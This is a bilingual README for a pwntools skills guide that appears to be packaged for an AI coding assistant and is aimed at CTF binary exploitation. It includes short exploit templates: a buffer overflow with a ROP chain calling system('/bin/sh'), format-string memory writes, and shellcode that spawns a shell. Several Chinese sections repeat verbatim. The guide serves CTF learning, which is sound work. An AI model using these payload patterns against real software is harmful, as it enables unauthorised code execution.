# Pwntools Skills Guide

[中文版本](#中文版本) | [English Version](#english-version)

---

## English Version

### Overview

**Pwntools Skills** is a comprehensive guide for using [pwntools](https://github.com/Gallopsled/pwntools) in CTF (Capture The Flag) competitions and binary exploitation. This skill provides structured documentation, practical examples, and best practices for binary exploitation, ROP chains, shellcode generation, format string exploitation, and more.

### Installation & Setup

#### Step 1: Clone the Repository

```bash
# Clone from GitHub
git clone https://github.com/HackC0der/pwntools-skills.git
cd pwntools-skills

# Or clone from your local path
git clone /path/to/pwntools-skills
cd pwntools-skills
```

#### Step 2: Install Pwntools

```bash
# Install pwntools (if not already installed)
pip install pwntools

# Or install from source
git clone https://github.com/Gallopsled/pwntools.git
cd pwntools
pip install -e .
```

#### Step 3: Copy Skills to Claude Code

For use with Claude Code, copy the skills directory to your Claude configuration:

```bash
# Copy skills to Claude Code global skills directory
cp -r skills ~/.claude/skills/pwntools-skills

# Or copy to project-specific skills directory
cp -r skills /path/to/your/project/.claude/skills/pwntools-skills
```

#### Step 4: Reference Documentation

Copy reference materials to your project:

```bash
# Copy reference documentation
cp -r reference /path/to/your/project/docs/pwntools-reference

# Or keep in project root
cp -r reference ./pwntools-reference
```

#### Step 5: Use Examples

Copy example scripts to your project:

```bash
# Copy all examples
cp -r examples /path/to/your/project/exploits/

# Or copy specific example
cp examples/buffer-overflow.py ./my-exploit.py
```

### Quick Start

```python
from pwn import *

# Configure context
context(arch='amd64', os='linux')

# Start process
p = process('./binary')

# Send and receive
p.sendline(b'input')
data = p.recv(1024)

# Interactive mode
p.interactive()
```

### What's Included

#### 📚 Skill Modules (11 files)
- **Tubes Communication** - Process/socket/SSH interaction
- **ELF Binary Analysis** - Binary parsing and symbol resolution
- **Packing Utilities** - Byte packing/unpacking
- **Shellcraft** - Shellcode generation
- **Cyclic Patterns** - Offset finding with cyclic patterns
- **ROP Exploitation** - ROP chain building
- **Format Strings** - Format string vulnerability exploitation
- **Context Configuration** - Global settings
- **Assembly/Disassembly** - Code generation and analysis
- **GDB Debugging** - Debugging integration
- **DynELF** - Runtime libc symbol resolution

#### 📖 Reference Documentation
- **modules-overview.md** - Complete module hierarchy and relationships
- **best-practices.md** - Development workflow and code organization
- **troubleshooting.md** - Common issues and solutions

#### 💻 Practical Examples
- **buffer-overflow.py** - Basic buffer overflow exploitation
- **rop-chain.py** - ROP chain building and execution
- **format-string.py** - Format string exploitation
- **shellcode.py** - Shellcode generation and injection

### Common Exploitation Patterns

#### Buffer Overflow with ROP
```python
# 1. Find offset
pattern = cyclic(200)
offset = cyclic_find(crash_addr)

# 2. Build ROP chain
elf = ELF('./binary')
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])

# 3. Send payload
payload = b'A' * offset + rop.chain()
p.sendline(payload)
```

#### Format String Exploitation
```python
# 1. Find offset (automated)
def exec_fmt(payload):
    p = process('./binary')
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

# 2. Write memory
payload = fmtstr_payload(offset, {target_addr: value})
p.sendline(payload)
```

#### Shellcode Injection
```python
# 1. Generate shellcode
context(arch='amd64', os='linux')
shellcode = asm(shellcraft.sh())

# 2. Inject and execute
payload = b'A' * offset + shellcode
p.sendline(payload)
```

### Architecture Support

Pwntools supports multiple architectures:
- **x86**: amd64, i386
- **ARM**: arm, thumb, aarch64
- **MIPS**: mips, mips64
- **PowerPC**: ppc, ppc64
- **SPARC**: sparc, sparc64
- **RISC-V**: riscv64

### Best Practices

1. **Always set context first**: `context(arch='amd64', os='linux')`
2. **Use cyclic patterns for offset finding**: More reliable than manual counting
3. **Enable logging during development**: `context.log_level = 'debug'`
4. **Test locally before remote**: Verify exploit works on local binary
5. **Handle timeouts gracefully**: Set appropriate timeout values
6. **Use context managers**: `with process('./binary') as p:` for auto-cleanup
7. **Verify protections**: Use `elf.checksec()` to understand mitigations

### File Structure

```
pwntools-skills/
├── SKILL.md                    # Main skill file
├── README.md                   # This file
├── reference/
│   ├── modules-overview.md     # Module reference
│   ├── best-practices.md       # Best practices
│   └── troubleshooting.md      # Troubleshooting guide
├── skills/
│   ├── tubes-communication.md
│   ├── elf-binary-analysis.md
│   ├── rop-exploitation.md
│   ├── format-string-exploitation.md
│   └── ... (7 more skill modules)
└── examples/
    ├── buffer-overflow.py
    ├── rop-chain.py
    ├── format-string.py
    └── shellcode.py
```

### How to Use This Skill

#### For Claude Code Users

1. **Copy skills to Claude Code**:
   ```bash
   cp -r skills ~/.claude/skills/pwntools-skills
   ```

2. **Reference in your project**:
   - Use `/pwntools-skills` command in Claude Code
   - Or reference specific modules like `/pwntools-skills:tubes-communication`

3. **Access documentation**:
   - Read `SKILL.md` for overview
   - Check `reference/` for detailed guides
   - Study `examples/` for practical code

#### For Direct Usage

1. **Read the documentation**:
   - Start with `SKILL.md` for overview
   - Read relevant skill modules in `skills/`
   - Check `reference/best-practices.md` for workflow

2. **Study the examples**:
   - `examples/buffer-overflow.py` - Basic exploitation
   - `examples/rop-chain.py` - ROP chains
   - `examples/format-string.py` - Format strings
   - `examples/gdb-debugging-workflow.py` - GDB debugging

3. **Reference when needed**:
   - `reference/modules-overview.md` - Module hierarchy
   - `reference/troubleshooting.md` - Common issues
   - `reference/best-practices.md` - Development workflow

#### For CTF Challenges

1. **Analyze the binary**:
   ```python
   from pwn import *
   elf = ELF('./binary')
   print(elf.checksec())
   ```

2. **Find the vulnerability**:
   - Buffer overflow? → Use `cyclic-patterns.md`
   - Format string? → Use `format-string-exploitation.md`
   - ROP needed? → Use `rop-exploitation.md`

3. **Build the exploit**:
   - Reference `examples/` for similar patterns
   - Check `reference/best-practices.md` for workflow
   - Use `gdb-debugging.md` for debugging

4. **Debug with GDB**:
   ```python
   p = process('./binary')
   gdb.attach(p, 'break main')
   p.interactive()
   ```

### Directory Usage Guide

#### `skills/` - Detailed Skill Modules

Each file covers a specific pwntools feature:

| File | Purpose | When to Use |
|------|---------|------------|
| `tubes-communication.md` | Process/socket/SSH | Communicating with binaries |
| `elf-binary-analysis.md` | Binary parsing | Analyzing target binary |
| `packing-utilities.md` | Byte packing | Working with binary data |
| `shellcraft-shellcode.md` | Shellcode generation | Creating payloads |
| `cyclic-patterns.md` | Offset finding | Buffer overflow exploitation |
| `rop-exploitation.md` | ROP chains | Bypassing NX/DEP |
| `format-string-exploitation.md` | Format strings | Format string bugs |
| `context-configuration.md` | Global settings | Configuring pwntools |
| `asm-disasm.md` | Assembly/disassembly | Code generation |
| `gdb-debugging.md` | GDB integration | Debugging exploits |
| `dynelf-libc-resolution.md` | Runtime resolution | Bypassing ASLR |

#### `reference/` - Reference Documentation

Comprehensive guides for development:

| File | Content |
|------|---------|
| `modules-overview.md` | Complete module hierarchy and relationships |
| `best-practices.md` | Development workflow, code organization, performance |
| `troubleshooting.md` | Common issues and solutions |

#### `examples/` - Practical Examples

Ready-to-use exploit templates:

| File | Demonstrates |
|------|--------------|
| `buffer-overflow.py` | Basic buffer overflow |
| `rop-chain.py` | ROP chain building |
| `format-string.py` | Format string exploitation |
| `shellcode.py` | Shellcode generation |
| `gdb-debugging-workflow.py` | Complete debugging workflow |

### Typical Workflow

#### 1. Analyze Binary
```bash
# Read elf-binary-analysis.md
# Run: elf = ELF('./binary'); print(elf.checksec())
```

#### 2. Find Vulnerability
```bash
# Identify vulnerability type
# Read corresponding skill module
```

#### 3. Build Exploit
```bash
# Reference examples/ for similar patterns
# Follow best-practices.md workflow
# Use gdb-debugging.md for debugging
```

#### 4. Test & Refine
```bash
# Test locally with process()
# Debug with gdb.attach()
# Test remotely with remote()
```

### File Structure

```
pwntools-skills/
├── SKILL.md                    # Main skill file
├── README.md                   # This file
├── reference/
│   ├── modules-overview.md     # Module reference
│   ├── best-practices.md       # Best practices
│   └── troubleshooting.md      # Troubleshooting guide
├── skills/
│   ├── tubes-communication.md
│   ├── elf-binary-analysis.md
│   ├── rop-exploitation.md
│   ├── format-string-exploitation.md
│   └── ... (7 more skill modules)
└── examples/
    ├── buffer-overflow.py
    ├── rop-chain.py
    ├── format-string.py
    └── shellcode.py
```

### Resources

- **Official Docs**: https://docs.pwntools.com/
- **GitHub**: https://github.com/Gallopsled/pwntools
- **Tutorials**: https://github.com/Gallopsled/pwntools-tutorial
- **Write-ups**: https://github.com/Gallopsled/pwntools-write-ups
- **Discord**: https://discord.gg/96VA2zvjCB

### When to Use This Skill

Use this skill when:
- Working on binary exploitation challenges (CTF, pwn)
- Building ROP chains or shellcode
- Analyzing ELF binaries
- Exploiting format string vulnerabilities
- Bypassing protections (ASLR, DEP, canaries)
- Debugging exploitation code with GDB
- Generating payloads for buffer overflows

### License

MIT License - See LICENSE file for details

---

## 中文版本

### 概述

**Pwntools 技能指南**是一份关于在 CTF（夺旗竞赛）和二进制利用中使用 [pwntools](https://github.com/Gallopsled/pwntools) 的综合指南。本技能提供结构化文档、实践示例和最佳实践，涵盖二进制利用、ROP 链、Shellcode 生成、格式字符串利用等内容。

### 安装与设置

#### 第 1 步：克隆仓库

```bash
# 从 GitHub 克隆
git clone https://github.com/HackC0der/pwntools-skills.git
cd pwntools-skills

# 或从本地路径克隆
git clone /path/to/pwntools-skills
cd pwntools-skills
```

#### 第 2 步：安装 Pwntools

```bash
# 安装 pwntools（如果尚未安装）
pip install pwntools

# 或从源代码安装
git clone https://github.com/Gallopsled/pwntools.git
cd pwntools
pip install -e .
```

#### 第 3 步：复制 Skills 到 Claude Code

用于 Claude Code，将 skills 目录复制到 Claude 配置：

```bash
# 复制 skills 到 Claude Code 全局 skills 目录
cp -r skills ~/.claude/skills/pwntools-skills

# 或复制到项目特定的 skills 目录
cp -r skills /path/to/your/project/.claude/skills/pwntools-skills
```

#### 第 4 步：参考文档

将参考材料复制到你的项目：

```bash
# 复制参考文档
cp -r reference /path/to/your/project/docs/pwntools-reference

# 或保留在项目根目录
cp -r reference ./pwntools-reference
```

#### 第 5 步：使用示例

将示例脚本复制到你的项目：

```bash
# 复制所有示例
cp -r examples /path/to/your/project/exploits/

# 或复制特定示例
cp examples/buffer-overflow.py ./my-exploit.py
```

### 快速开始

```python
from pwn import *

# 配置上下文
context(arch='amd64', os='linux')

# 启动进程
p = process('./binary')

# 发送和接收
p.sendline(b'input')
data = p.recv(1024)

# 交互模式
p.interactive()
```

### 包含内容

#### 📚 技能模块（11 个文件）
- **Tubes 通信** - 进程/套接字/SSH 交互
- **ELF 二进制分析** - 二进制解析和符号解析
- **打包工具** - 字节打包/解包
- **Shellcraft** - Shellcode 生成
- **循环模式** - 使用循环模式查找偏移
- **ROP 利用** - ROP 链构建
- **格式字符串** - 格式字符串漏洞利用
- **上下文配置** - 全局设置
- **汇编/反汇编** - 代码生成和分析
- **GDB 调试** - 调试集成
- **DynELF** - 运行时 libc 符号解析

#### 📖 参考文档
- **modules-overview.md** - 完整的模块层级和关系
- **best-practices.md** - 开发工作流和代码组织
- **troubleshooting.md** - 常见问题和解决方案

#### 💻 实践示例
- **buffer-overflow.py** - 基础缓冲区溢出利用
- **rop-chain.py** - ROP 链构建和执行
- **format-string.py** - 格式字符串利用
- **shellcode.py** - Shellcode 生成和注入
- **gdb-debugging-workflow.py** - 完整调试工作流

### 常见利用模式

#### 缓冲区溢出 + ROP
```python
# 1. 查找偏移
pattern = cyclic(200)
offset = cyclic_find(crash_addr)

# 2. 构建 ROP 链
elf = ELF('./binary')
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])

# 3. 发送负载
payload = b'A' * offset + rop.chain()
p.sendline(payload)
```

#### 格式字符串利用
```python
# 1. 查找偏移（自动化）
def exec_fmt(payload):
    p = process('./binary')
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

# 2. 写入内存
payload = fmtstr_payload(offset, {target_addr: value})
p.sendline(payload)
```

#### Shellcode 注入
```python
# 1. 生成 shellcode
context(arch='amd64', os='linux')
shellcode = asm(shellcraft.sh())

# 2. 注入并执行
payload = b'A' * offset + shellcode
p.sendline(payload)
```

### 架构支持

Pwntools 支持多种架构：
- **x86**: amd64, i386
- **ARM**: arm, thumb, aarch64
- **MIPS**: mips, mips64
- **PowerPC**: ppc, ppc64
- **SPARC**: sparc, sparc64
- **RISC-V**: riscv64

### 最佳实践

1. **始终先设置上下文**: `context(arch='amd64', os='linux')`
2. **使用循环模式查找偏移**: 比手动计数更可靠
3. **开发时启用日志**: `context.log_level = 'debug'`
4. **本地测试后再远程测试**: 验证利用在本地二进制上有效
5. **优雅处理超时**: 设置适当的超时值
6. **使用上下文管理器**: `with process('./binary') as p:` 自动清理
7. **验证保护机制**: 使用 `elf.checksec()` 了解防护措施

### 如何使用本技能

#### 对于 Claude Code 用户

1. **复制 skills 到 Claude Code**:
   ```bash
   cp -r skills ~/.claude/skills/pwntools-skills
   ```

2. **在项目中引用**:
   - 在 Claude Code 中使用 `/pwntools-skills` 命令
   - 或引用特定模块，如 `/pwntools-skills:tubes-communication`

3. **访问文档**:
   - 阅读 `SKILL.md` 获取概述
   - 查看 `reference/` 获取详细指南
   - 学习 `examples/` 获取实践代码

#### 对于直接使用

1. **阅读文档**:
   - 从 `SKILL.md` 开始获取概述
   - 阅读 `skills/` 中的相关技能模块
   - 查看 `reference/best-practices.md` 获取工作流

2. **学习示例**:
   - `examples/buffer-overflow.py` - 基础利用
   - `examples/rop-chain.py` - ROP 链
   - `examples/format-string.py` - 格式字符串
   - `examples/gdb-debugging-workflow.py` - GDB 调试

3. **需要时参考**:
   - `reference/modules-overview.md` - 模块层级
   - `reference/troubleshooting.md` - 常见问题
   - `reference/best-practices.md` - 开发工作流

#### 对于 CTF 挑战

1. **分析二进制**:
   ```python
   from pwn import *
   elf = ELF('./binary')
   print(elf.checksec())
   ```

2. **找到漏洞**:
   - 缓冲区溢出? → 使用 `cyclic-patterns.md`
   - 格式字符串? → 使用 `format-string-exploitation.md`
   - 需要 ROP? → 使用 `rop-exploitation.md`

3. **构建利用**:
   - 参考 `examples/` 获取类似模式
   - 查看 `reference/best-practices.md` 获取工作流
   - 使用 `gdb-debugging.md` 进行调试

4. **使用 GDB 调试**:
   ```python
   p = process('./binary')
   gdb.attach(p, 'break main')
   p.interactive()
   ```

### 目录使用指南

#### `skills/` - 详细技能模块

每个文件涵盖特定的 pwntools 功能：

| 文件 | 用途 | 何时使用 |
|------|------|---------|
| `tubes-communication.md` | 进程/套接字/SSH | 与二进制通信 |
| `elf-binary-analysis.md` | 二进制解析 | 分析目标二进制 |
| `packing-utilities.md` | 字节打包 | 处理二进制数据 |
| `shellcraft-shellcode.md` | Shellcode 生成 | 创建负载 |
| `cyclic-patterns.md` | 偏移查找 | 缓冲区溢出利用 |
| `rop-exploitation.md` | ROP 链 | 绕过 NX/DEP |
| `format-string-exploitation.md` | 格式字符串 | 格式字符串漏洞 |
| `context-configuration.md` | 全局设置 | 配置 pwntools |
| `asm-disasm.md` | 汇编/反汇编 | 代码生成 |
| `gdb-debugging.md` | GDB 集成 | 调试利用 |
| `dynelf-libc-resolution.md` | 运行时解析 | 绕过 ASLR |

#### `reference/` - 参考文档

开发的综合指南：

| 文件 | 内容 |
|------|------|
| `modules-overview.md` | 完整的模块层级和关系 |
| `best-practices.md` | 开发工作流、代码组织、性能 |
| `troubleshooting.md` | 常见问题和解决方案 |

#### `examples/` - 实践示例

现成的利用模板：

| 文件 | 演示内容 |
|------|---------|
| `buffer-overflow.py` | 基础缓冲区溢出 |
| `rop-chain.py` | ROP 链构建 |
| `format-string.py` | 格式字符串利用 |
| `shellcode.py` | Shellcode 生成 |
| `gdb-debugging-workflow.py` | 完整调试工作流 |

### 典型工作流

#### 1. 分析二进制
```bash
# 阅读 elf-binary-analysis.md
# 运行: elf = ELF('./binary'); print(elf.checksec())
```

#### 2. 找到漏洞
```bash
# 识别漏洞类型
# 阅读相应的技能模块
```

#### 3. 构建利用
```bash
# 参考 examples/ 获取类似模式
# 遵循 best-practices.md 工作流
# 使用 gdb-debugging.md 进行调试
```

#### 4. 测试和改进
```bash
# 使用 process() 本地测试
# 使用 gdb.attach() 调试
# 使用 remote() 远程测试
```

### 文件结构

```
pwntools-skills/
├── SKILL.md                    # 主技能文件
├── README.md                   # 本文件
├── reference/
│   ├── modules-overview.md     # 模块参考
│   ├── best-practices.md       # 最佳实践
│   └── troubleshooting.md      # 故障排除指南
├── skills/
│   ├── tubes-communication.md
│   ├── elf-binary-analysis.md
│   ├── rop-exploitation.md
│   ├── format-string-exploitation.md
│   └── ... (7 个其他技能模块)
└── examples/
    ├── buffer-overflow.py
    ├── rop-chain.py
    ├── format-string.py
    ├── shellcode.py
    └── gdb-debugging-workflow.py
```

### 资源

- **官方文档**: https://docs.pwntools.com/
- **GitHub**: https://github.com/Gallopsled/pwntools
- **教程**: https://github.com/Gallopsled/pwntools-tutorial
- **Write-ups**: https://github.com/Gallopsled/pwntools-write-ups
- **Discord**: https://discord.gg/96VA2zvjCB

### 何时使用本技能

在以下情况下使用本技能：
- 参与二进制利用挑战（CTF、pwn）
- 构建 ROP 链或 Shellcode
- 分析 ELF 二进制文件
- 利用格式字符串漏洞
- 绕过保护机制（ASLR、DEP、栈金丝雀）
- 使用 GDB 调试利用代码
- 为缓冲区溢出生成负载

### 许可证

MIT 许可证 - 详见 LICENSE 文件

---

### 贡献

欢迎提交 Issue 和 Pull Request！

### 联系方式

- GitHub: https://github.com/HackC0der/pwntools-skills
- Issues: https://github.com/HackC0der/pwntools-skills/issues

### 常见利用模式

#### 缓冲区溢出 + ROP
```python
# 1. 查找偏移
pattern = cyclic(200)
offset = cyclic_find(crash_addr)

# 2. 构建 ROP 链
elf = ELF('./binary')
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])

# 3. 发送负载
payload = b'A' * offset + rop.chain()
p.sendline(payload)
```

#### 格式字符串利用
```python
# 1. 查找偏移（自动化）
def exec_fmt(payload):
    p = process('./binary')
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

# 2. 写入内存
payload = fmtstr_payload(offset, {target_addr: value})
p.sendline(payload)
```

#### Shellcode 注入
```python
# 1. 生成 shellcode
context(arch='amd64', os='linux')
shellcode = asm(shellcraft.sh())

# 2. 注入并执行
payload = b'A' * offset + shellcode
p.sendline(payload)
```

### 架构支持

Pwntools 支持多种架构：
- **x86**: amd64, i386
- **ARM**: arm, thumb, aarch64
- **MIPS**: mips, mips64
- **PowerPC**: ppc, ppc64
- **SPARC**: sparc, sparc64
- **RISC-V**: riscv64

### 最佳实践

1. **始终先设置上下文**: `context(arch='amd64', os='linux')`
2. **使用循环模式查找偏移**: 比手动计数更可靠
3. **开发时启用日志**: `context.log_level = 'debug'`
4. **本地测试后再远程测试**: 验证利用在本地二进制上有效
5. **优雅处理超时**: 设置适当的超时值
6. **使用上下文管理器**: `with process('./binary') as p:` 自动清理
7. **验证保护机制**: 使用 `elf.checksec()` 了解防护措施

### 文件结构

```
pwntools-skills/
├── SKILL.md                    # 主技能文件
├── README.md                   # 本文件
├── reference/
│   ├── modules-overview.md     # 模块参考
│   ├── best-practices.md       # 最佳实践
│   └── troubleshooting.md      # 故障排除指南
├── skills/
│   ├── tubes-communication.md
│   ├── elf-binary-analysis.md
│   ├── rop-exploitation.md
│   ├── format-string-exploitation.md
│   └── ... (7 个其他技能模块)
└── examples/
    ├── buffer-overflow.py
    ├── rop-chain.py
    ├── format-string.py
    └── shellcode.py
```

### 资源

- **官方文档**: https://docs.pwntools.com/
- **GitHub**: https://github.com/Gallopsled/pwntools
- **教程**: https://github.com/Gallopsled/pwntools-tutorial
- **Write-ups**: https://github.com/Gallopsled/pwntools-write-ups
- **Discord**: https://discord.gg/96VA2zvjCB

### 何时使用本技能

在以下情况下使用本技能：
- 参与二进制利用挑战（CTF、pwn）
- 构建 ROP 链或 Shellcode
- 分析 ELF 二进制文件
- 利用格式字符串漏洞
- 绕过保护机制（ASLR、DEP、栈金丝雀）
- 使用 GDB 调试利用代码
- 为缓冲区溢出生成负载

### 许可证

MIT 许可证 - 详见 LICENSE 文件

---

### 贡献

欢迎提交 Issue 和 Pull Request！

### 联系方式

- GitHub: https://github.com/HackC0der/pwntools-skills
- Issues: https://github.com/HackC0der/pwntools-skills/issues
